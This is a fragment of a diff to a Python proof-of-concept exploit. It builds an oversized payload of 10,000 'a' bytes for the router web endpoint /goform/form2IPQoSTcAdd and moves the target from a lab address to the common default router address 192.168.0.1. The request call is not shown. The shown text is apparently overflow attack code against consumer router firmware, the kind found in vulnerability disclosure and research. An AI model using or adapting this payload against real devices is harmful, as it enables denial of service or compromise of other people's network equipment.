@@ -32,7 +32,7 @@ import requests
 
 tokenid = 'xxx'
 
-url = 'http://10.211.55.20/goform/form2IPQoSTcAdd'
+url = 'http://192.168.0.1/goform/form2IPQoSTcAdd'
 
 payload = b'a' * 10000
 
